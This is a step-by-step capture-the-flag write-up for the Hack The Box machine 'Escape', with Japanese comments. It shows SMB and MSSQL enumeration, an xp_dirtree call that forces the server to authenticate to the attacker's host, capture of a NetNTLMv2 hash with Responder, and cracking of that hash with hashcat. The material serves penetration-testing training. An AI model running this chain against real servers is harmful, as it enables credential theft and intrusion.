https://app.hackthebox.com/machines/531

## STEP 1
```sh
└─$ rustscan -a 10.129.228.253 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.228.253:53
Open 10.129.228.253:88
Open 10.129.228.253:593
Open 10.129.228.253:636
Open 10.129.228.253:1433
Open 10.129.228.253:3268
Open 10.129.228.253:3269
Open 10.129.228.253:5985
Open 10.129.228.253:9389
Open 10.129.228.253:49667
Open 10.129.228.253:49690
Open 10.129.228.253:49689
Open 10.129.228.253:49711
Open 10.129.228.253:49721
Open 10.129.228.253:49742
10.129.228.253 -> [53,88,593,636,1433,3268,3269,5985,9389,49667,49690,49689,49711,49721,49742]
```


## STEP 2
guestでsmb列挙
```sh
└─$ netexec smb 10.129.228.253 -u ' ' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False) 
SMB         10.129.228.253  445    DC               [+] sequel.htb\ : (Guest)
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
```
pdfファイルを発見・ダウンロード
```sh
└─$ smbclient -N -c ls //10.129.228.253/Public          
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                5184255 blocks of size 4096. 1447083 blocks available

└─$ smbget -N 'smb://10.129.228.253/Public/SQL Server Procedures.pdf'
Using domain: WORKGROUP, user: kali
smb://10.129.228.253/Public/SQL Server Procedures.pdf 
Downloaded 48.39kB in 15 seconds
```
pdfはmssqlに関するもの、step1で1433番がオープンであったことを確認したのでmssqlが動作している  
ユーザ名`PublicUser`パスワード`GuestUserCantWrite1@`を確認
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Escape_01.png">  
pdfのクレデンシャルでmssqlにログイン成功
```sh
└─$ impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.129.228.253'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```


## STEP 3
mssqlの情報を列挙  
xp_cmdshellは無効だが、xp_dirtreeは使用可能みたい  
```sh
msf auxiliary(scanner/mssql/mssql_login) > use auxiliary/admin/mssql/mssql_enum
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST

msf auxiliary(admin/mssql/mssql_enum) > set database master
database => master

msf auxiliary(admin/mssql/mssql_enum) > set username PublicUser
username => PublicUser

msf auxiliary(admin/mssql/mssql_enum) > set password GuestUserCantWrite1
password => GuestUserCantWrite1

msf auxiliary(admin/mssql/mssql_enum) > set rhosts 10.129.228.253
rhosts => 10.129.228.253

msf auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 10.129.228.253
[*] 10.129.228.253:1433 - Running MS SQL Server Enumeration...
[*] 10.129.228.253:1433 - Version:
[*]     Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]             Sep 24 2019 13:48:23 
[*]             Copyright (C) 2019 Microsoft Corporation
[*]             Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] 10.129.228.253:1433 - Configuration Parameters:
[*] 10.129.228.253:1433 -       C2 Audit Mode is Not Enabled
[*] 10.129.228.253:1433 -       xp_cmdshell is Not Enabled
[*] 10.129.228.253:1433 -       remote access is Enabled
[*] 10.129.228.253:1433 -       allow updates is Not Enabled
[*] 10.129.228.253:1433 -       Database Mail XPs is Not Enabled
[*] 10.129.228.253:1433 -       Ole Automation Procedures are Not Enabled
[*] 10.129.228.253:1433 - Databases on the server:
[*] 10.129.228.253:1433 -       Database name:master
[*] 10.129.228.253:1433 -       Database Files for master:
[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\master.mdf
[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\mastlog.ldf
[*] 10.129.228.253:1433 -       Database name:tempdb
[*] 10.129.228.253:1433 -       Database Files for tempdb:
[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\tempdb.mdf
[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\templog.ldf
[*] 10.129.228.253:1433 -       Database name:model
[*] 10.129.228.253:1433 -       Database Files for model:
[*] 10.129.228.253:1433 -       Database name:msdb
[*] 10.129.228.253:1433 -       Database Files for msdb:
[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBData.mdf
[*] 10.129.228.253:1433 -               C:\Program Files\Microsoft SQL Server\MSSQL15.SQLMOCK\MSSQL\DATA\MSDBLog.ldf
[*] 10.129.228.253:1433 - System Logins on this Server:
[*] 10.129.228.253:1433 -       sa
[*] 10.129.228.253:1433 -       PublicUser
[*] 10.129.228.253:1433 - Disabled Accounts:
[*] 10.129.228.253:1433 -       No Disabled Logins Found
[*] 10.129.228.253:1433 - No Accounts Policy is set for:
[*] 10.129.228.253:1433 -       All System Accounts have the Windows Account Policy Applied to them.
[*] 10.129.228.253:1433 - Password Expiration is not checked for:
[*] 10.129.228.253:1433 -       sa
[*] 10.129.228.253:1433 -       PublicUser
[*] 10.129.228.253:1433 - System Admin Logins on this Server:
[*] 10.129.228.253:1433 -       sa
[*] 10.129.228.253:1433 - Windows Logins on this Server:
[*] 10.129.228.253:1433 -       No Windows logins found!
[*] 10.129.228.253:1433 - Windows Groups that can logins on this Server:
[*] 10.129.228.253:1433 -       No Windows Groups where found with permission to login to system.
[*] 10.129.228.253:1433 - Accounts with Username and Password being the same:
[*] 10.129.228.253:1433 -       No Account with its password being the same as its username was found.
[*] 10.129.228.253:1433 - Accounts with empty password:
[*] 10.129.228.253:1433 -       No Accounts with empty passwords where found.
[*] 10.129.228.253:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.129.228.253:1433 -       sp_replsetsyncstatus
[*] 10.129.228.253:1433 -       sp_replcounters
[*] 10.129.228.253:1433 -       sp_replsendtoqueue
[*] 10.129.228.253:1433 -       sp_resyncexecutesql
[*] 10.129.228.253:1433 -       sp_prepexecrpc
[*] 10.129.228.253:1433 -       sp_repltrans
[*] 10.129.228.253:1433 -       sp_xml_preparedocument
[*] 10.129.228.253:1433 -       xp_qv
[*] 10.129.228.253:1433 -       xp_getnetname
[*] 10.129.228.253:1433 -       sp_releaseschemalock
[*] 10.129.228.253:1433 -       sp_refreshview
[*] 10.129.228.253:1433 -       sp_replcmds
[*] 10.129.228.253:1433 -       sp_unprepare
[*] 10.129.228.253:1433 -       sp_resyncprepare
[*] 10.129.228.253:1433 -       sp_createorphan
[*] 10.129.228.253:1433 -       xp_dirtree
[*] 10.129.228.253:1433 -       sp_replwritetovarbin
[*] 10.129.228.253:1433 -       sp_replsetoriginator
[*] 10.129.228.253:1433 -       sp_xml_removedocument
[*] 10.129.228.253:1433 -       sp_repldone
[*] 10.129.228.253:1433 -       sp_reset_connection
[*] 10.129.228.253:1433 -       xp_fileexist
[*] 10.129.228.253:1433 -       xp_fixeddrives
[*] 10.129.228.253:1433 -       sp_getschemalock
[*] 10.129.228.253:1433 -       sp_prepexec
[*] 10.129.228.253:1433 -       xp_revokelogin
[*] 10.129.228.253:1433 -       sp_execute_external_script
[*] 10.129.228.253:1433 -       sp_resyncuniquetable
[*] 10.129.228.253:1433 -       sp_replflush
[*] 10.129.228.253:1433 -       sp_resyncexecute
[*] 10.129.228.253:1433 -       xp_grantlogin
[*] 10.129.228.253:1433 -       sp_droporphans
[*] 10.129.228.253:1433 -       xp_regread
[*] 10.129.228.253:1433 -       sp_getbindtoken
[*] 10.129.228.253:1433 -       sp_replincrementlsn
[*] 10.129.228.253:1433 - Instances found on this server:
[*] 10.129.228.253:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.129.228.253:1433 -       xp_regread might be disabled in this system
[*] Auxiliary module execution completed
```
ということで、ストアドプロシージャのxp_dirtreeでkaliに認証リクエストを飛ばしクレデンシャルをキャプチャ
```sh
SQL (PublicUser  guest@master)> xp_dirtree \\10.10.16.28\share
subdirectory   depth   file   
------------   -----   ---- 
```
ユーザ名sql_svcのntハッシュを取得！
```sh
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.28]
    Responder IPv6             [dead:beef:4::101a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-1LRZOH31C2F]
    Responder Domain Name      [548O.LOCAL]
    Responder DCE-RPC Port     [49472]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                            

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C00030014003500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC01060004000200000008003000300000000000000000000000003000004136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320038000000000000000000
```
sql_svcのntハッシュをクラック成功  
パスワードは、REGGIE1234ronnieと判明
```sh
└─$ name-that-hash -f sql_svc.txt --no-banner

sql_svc::sequel:b964916c38c95c45:E50990E2249A62E23A3F59AD32B1FA11:010100000000000080FCBBD78644DC017B47D91AF8DF22A000000000020008003500340038004F0001001E00570049004E002
D0031004C0052005A004F0048003300310043003200460004003400570049004E002D0031004C0052005A004F004800330031004300320046002E003500340038004F002E004C004F00430041004C0003001400
3500340038004F002E004C004F00430041004C00050014003500340038004F002E004C004F00430041004C000700080080FCBBD78644DC010600040002000000080030003000000000000000000000000030000
04136924FE60D10CB1E5AA1D1FD8055AA7669D12D66160B96227646026A91227D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E
00320038000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

└─$ hashcat -a 0 -m 5600 sql_svc.txt /usr/share/wordlists/rockyou.txt --quiet
SQL_SVC::sequel:b964916c38c95c45:e50990e2249a62e23a3f59ad32b1fa11:010100000000000080fcbbd78644dc017b47d91af8df22a000000000020008003500340038004f0001001e00570049004e002d0031004c0052005a004f0048003300310043003200460004003400570049004e002d0031004c0052005a004f004800330031004300320046002e003500340038004f002e004c004f00430041004c00030014003500340038004f002e004c004f00430041004c00050014003500340038004f002e004c004f00430041004c000700080080fcbbd78644dc01060004000200000008003000300000000000000000000000003000004136924fe60d10cb1e5aa1d1fd8055aa7669d12d66160b96227646026a91227d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00320038000000000000000000:REGGIE1234ronnie
```
